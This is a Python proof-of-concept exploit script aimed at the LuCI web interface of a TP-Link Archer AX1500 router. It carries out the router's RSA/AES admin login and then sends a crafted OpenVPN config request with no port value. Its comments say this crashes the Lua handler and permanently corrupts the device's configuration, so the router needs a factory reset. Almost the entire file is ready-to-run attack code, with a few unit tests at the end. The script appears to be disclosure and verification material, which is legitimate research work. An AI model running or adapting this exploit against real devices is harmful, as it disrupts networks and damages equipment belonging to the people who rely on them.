#!/usr/bin/env python3
"""
PoC: TP-Link Archer AX1500 OpenVPN LuCI Handler DoS + Permanent UCI Corruption
CVE-2026-TPLINK-OPENVPN-LUA-DOS

Authenticated LuCI session sends crafted openvpn?form=config request with
enabled=on&proto=udp (no port), triggering Lua nil comparison crash and
permanently corrupting OpenVPN UCI config.

Usage:
    python3 poc_openvpn_lua_dos.py <router_ip> <admin_password>
    python3 poc_openvpn_lua_dos.py 192.168.0.2 admin123

Requirements:
    pip install requests pycryptodome
"""

import sys
import time
import json
import hashlib
import base64
import requests
import urllib3

urllib3.disable_warnings()

TARGET   = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.2"
PASSWORD = sys.argv[2] if len(sys.argv) > 2 else "admin"

try:
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import unpad
except ImportError:
    sys.exit("Missing pycryptodome: pip install pycryptodome")


# ---- LuCI auth (RSA+AES) ----

def _aes_dec(b64data: str, k: str, iv: str) -> str:
    raw = base64.b64decode(b64data)
    cipher = AES.new(k.encode(), AES.MODE_CBC, iv.encode())
    return unpad(cipher.decrypt(raw), 16).decode(errors="replace")


def _luci_login(target: str, password: str):
    s = requests.Session()
    s.verify = False
    base = f"https://{target}/cgi-bin/luci"

    # Step 1: get RSA challenge
    r = s.get(f"{base}/?form=login", timeout=8)
    data = r.json()
    seq  = int(data["seq"])
    n    = int(data["data"]["n"], 16)
    e    = int(data["data"]["e"], 16)
    key  = data["data"]["key"]   # AES key (16 hex chars)
    iv   = data["data"]["iv"]    # AES IV  (16 hex chars)

    # Step 2: build RSA-encrypted sign
    md5pw = hashlib.md5(password.encode()).hexdigest()
    plain  = f"k={key}&i={iv}&h={md5pw}&s={seq}{len(password)}"
    rsa_key  = RSA.construct((n, e))
    cipher   = PKCS1_v1_5.new(rsa_key)
    sign_b64 = base64.b64encode(cipher.encrypt(plain.encode())).decode()

    # Step 3: login
    r = s.post(f"{base}/?form=login", data={
        "operation": "login",
        "username":  "admin",
        "sign":      sign_b64,
    }, timeout=8)
    resp_data = _aes_dec(r.json()["data"], key, iv)
    parsed    = json.loads(resp_data)
    stok      = parsed["stok"]
    return s, key, iv, stok


# ---- PoC ----

def read_openvpn_config(s, target: str, key: str, iv: str, stok: str) -> dict:
    url = f"https://{target}/cgi-bin/luci/;stok={stok}/admin/openvpn"
    r = s.get(url, params={"form": "config", "operation": "read"},
              headers={"X-Requested-With": "XMLHttpRequest"}, timeout=8)
    try:
        raw = _aes_dec(r.json()["data"], key, iv)
        return json.loads(raw)
    except Exception:
        return {"raw": r.text[:300]}


def trigger_lua_crash(s, target: str, key: str, iv: str, stok: str) -> dict:
    url = f"https://{target}/cgi-bin/luci/;stok={stok}/admin/openvpn"
    r = s.get(url, params={
        "form":      "config",
        "operation": "write",
        "enabled":   "on",
        "proto":     "udp",
        # port intentionally omitted — triggers nil comparison
    }, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=10)
    try:
        raw = _aes_dec(r.json()["data"], key, iv)
        return json.loads(raw)
    except Exception:
        return {"raw": r.text[:300]}


def run_poc():
    print(f"[*] Target: {TARGET}")
    print(f"[*] CVE-2026-TPLINK-OPENVPN-LUA-DOS — OpenVPN Lua DoS + UCI Corruption\n")

    print("[*] Authenticating...")
    try:
        s, key, iv, stok = _luci_login(TARGET, PASSWORD)
    except Exception as ex:
        print(f"[-] Login failed: {ex}")
        sys.exit(1)
    print(f"[+] Authenticated. stok={stok[:16]}...")

    # Step 1: baseline read
    print("\n[*] Step 1: baseline read of openvpn?form=config")
    before = read_openvpn_config(s, TARGET, key, iv, stok)
    print(f"    Before: {before}")
    if "invalid uci config" in str(before).lower():
        print("[!] Already corrupted from prior run — vulnerability already triggered")

    # Step 2: trigger crash
    print("\n[*] Step 2: sending crash trigger (enabled=on&proto=udp, no port)")
    result = trigger_lua_crash(s, TARGET, key, iv, stok)
    print(f"    Response: {result}")

    lua_crash = "attempt to compare nil with number" in str(result).lower()
    if lua_crash:
        print("\n[!!!] VULNERABLE — Lua runtime error confirmed:")
        print(f"      errorcode: {result.get('errorcode','')}")
    else:
        print(f"\n[?] Unexpected response — may already be corrupted or patched")

    # Step 3: verify UCI corruption persists
    time.sleep(1)
    print("\n[*] Step 3: re-reading openvpn config (UCI corruption check)")
    after = read_openvpn_config(s, TARGET, key, iv, stok)
    print(f"    After:  {after}")

    corrupted = "invalid uci config" in str(after).lower()
    if corrupted:
        print("\n[!!!] UCI PERMANENTLY CORRUPTED — all subsequent reads return:")
        print(f"      {after}")
        print("      Factory reset required to repair.")
    elif lua_crash:
        print("\n[!] Lua crash confirmed but UCI may auto-recover. Re-run to verify persistence.")

    return lua_crash or corrupted


if __name__ == "__main__":
    if "--test" not in sys.argv:
        run_poc()


# === Tests ===
def test_poc_logic():
    """Unit tests — do NOT require live target."""
    # AES decrypt roundtrip
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import base64

    k, iv = "abcdef1234567890", "1234567890abcdef"
    plaintext = b'{"success":false,"errorcode":"attempt to compare nil with number"}'
    cipher = AES.new(k.encode(), AES.MODE_CBC, iv.encode())
    enc = base64.b64encode(cipher.encrypt(pad(plaintext, 16))).decode()
    assert _aes_dec(enc, k, iv) == plaintext.decode()

    # Error string detection
    resp = {"success": False, "errorcode": "attempt to compare nil with number"}
    assert "attempt to compare nil with number" in str(resp).lower()

    # Corruption detection
    resp2 = {"success": False, "errorcode": "invalid uci config"}
    assert "invalid uci config" in str(resp2).lower()

    print("[test] All unit tests passed")


if "--test" in sys.argv:
    test_poc_logic()
